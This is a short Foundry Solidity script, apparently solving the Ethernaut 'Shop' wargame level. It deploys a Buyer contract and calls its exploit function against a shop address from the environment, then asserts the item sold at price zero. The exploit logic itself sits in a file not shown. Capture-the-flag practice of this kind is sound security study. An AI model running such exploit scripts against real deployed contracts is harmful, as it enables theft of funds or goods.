// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import {Shop} from "../src/Shop.sol";
import {Buyer} from "../src/Buyer.sol";

contract ShopScript is Script, Test {
    function run() public {
        address deployer = vm.rememberKey(vm.envUint("PRIVATE_KEY"));

        vm.startBroadcast(deployer);

        Shop shop = Shop(vm.envAddress("SHOP"));
        Buyer buyer = new Buyer();
        buyer.exploit(shop);

        assertTrue(shop.isSold());
        assertEq(shop.price(), 0);

        vm.stopBroadcast();
    }
}
